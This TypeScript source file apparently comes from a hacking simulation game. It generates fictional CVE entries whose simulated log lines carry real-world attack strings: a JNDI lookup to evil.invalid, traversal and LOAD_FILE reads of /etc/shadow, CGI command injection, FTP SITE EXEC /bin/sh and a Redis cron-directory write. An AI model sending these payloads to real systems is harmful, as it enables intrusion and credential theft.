import { createPrng, type Prng } from '../prng';
import type { AttackPattern, Severity, Vulnerability } from '../../network/types';
import type { GeneratedVersion } from './walker';
import { pickEffect } from './effectPicker';

// Deterministic CVE construction for procedurally generated timeline entries.
// Each generated CVE has:
// - A CVE id derived from (service, index)
// - A generic service-specific attack pattern (or syslog fallback)
// - A weighted-random severity
// - publishedAt copied from the walker entry

// Attack pattern templates per service. Used when a procedural CVE needs
// an attack pattern (generic, not CVE-specific). Each service picks from
// its own list; services without a template fall through to the syslog
// fallback below.
const GENERATED_ATTACK_PATTERNS: Readonly<Record<string, readonly AttackPattern[]>> = {
  http: [
    {
      logFile: '/var/log/access.log',
      method: 'GET',
      path: '/cgi-bin/?cmd=id',
      status: 500,
    },
    {
      logFile: '/var/log/access.log',
      method: 'GET',
      path: '/?file=../../../../etc/shadow',
      status: 404,
    },
    {
      logFile: '/var/log/access.log',
      method: 'POST',
      path: '/admin/login',
      status: 500,
    },
    {
      logFile: '/var/log/access.log',
      method: 'GET',
      path: '/?x=${jndi:ldap://evil.invalid/a}',
      status: 200,
    },
  ],
  'http-alt': [
    {
      logFile: '/var/log/access.log',
      method: 'POST',
      path: '/manager/html',
      status: 500,
    },
  ],
  https: [
    {
      logFile: '/var/log/access.log',
      method: 'GET',
      path: '/api/v1/users?admin=true',
      status: 500,
    },
  ],
  ftp: [
    { logFile: '/var/log/vsftpd.log', command: 'SITE EXEC /bin/sh' },
    { logFile: '/var/log/vsftpd.log', command: "USER admin'\\0" },
  ],
  mysql: [
    { logFile: '/var/log/mysql.log', query: "SELECT LOAD_FILE('/etc/shadow')" },
    {
      logFile: '/var/log/mysql.log',
      query: "SET GLOBAL general_log_file = '/var/lib/mysql/pwn.so'",
    },
  ],
  redis: [
    { logFile: '/var/log/redis.log', message: 'CONFIG SET dir /var/spool/cron' },
    { logFile: '/var/log/redis.log', message: 'EVAL os.execute bypass attempt' },
  ],
  smtp: [
    {
      logFile: '/var/log/mail.log',
      daemon: 'postfix/smtpd',
      message: 'warning: malformed MAIL FROM buffer overflow',
    },
  ],
  imap: [
    {
      logFile: '/var/log/mail.log',
      daemon: 'dovecot',
      message: 'imap-login: stack overflow in LIST command',
    },
  ],
  pop3: [
    {
      logFile: '/var/log/mail.log',
      daemon: 'dovecot',
      message: 'pop3-login: crash in RETR parser',
    },
  ],
};

const GENERIC_SYSLOG_ATTACK = (service: string, version: string): AttackPattern => ({
  logFile: '/var/log/syslog',
  daemon: service,
  message: `anomalous request targeting ${version}`,
});

const pickGeneratedSeverity = (prng: Prng): Severity => {
  // Weighted toward high (the "typical" CVE). Critical is rare but present.
  // Info is never generated in Phase 3 — activated in Phase 4 with typed effects.
  const roll = prng.nextInt(0, 99);
  if (roll < 10) return 'critical'; // 10%
  if (roll < 60) return 'high'; // 50%
  if (roll < 90) return 'medium'; // 30%
  return 'low'; // 10%
};

// Deterministically build a Vulnerability object from a generated timeline
// entry. Every generated CVE for the same (service, index) produces the
// same result regardless of when it's called.
export const buildGeneratedVuln = (service: string, entry: GeneratedVersion): Vulnerability => {
  const prng = createPrng(`generated-cve:${service}:${entry.index}`);

  // CVE id: CVE-YYYY-NNNN with YYYY derived from publishedAt (roughly calendar year)
  const year = 2026 + Math.floor(entry.publishedAt / 365);
  const serial = 1000 + prng.nextInt(0, 8999);
  const cve = `CVE-${year}-${String(serial).padStart(4, '0')}`;

  const severity = pickGeneratedSeverity(prng);

  const patternPool = GENERATED_ATTACK_PATTERNS[service];
  const attackPattern = patternPool
    ? prng.pick(patternPool)
    : GENERIC_SYSLOG_ATTACK(service, entry.version);

  // Effect is rolled AFTER all existing picks so the PRNG sequence for
  // CVE id, severity, and attack pattern is preserved from Phase 3.
  const effect = pickEffect(service, prng);

  return {
    cve,
    description: `${service} ${entry.version} remote code execution (${cve})`,
    serviceVersion: entry.version,
    attackPattern,
    severity,
    publishedAt: entry.publishedAt,
    effect,
  };
};
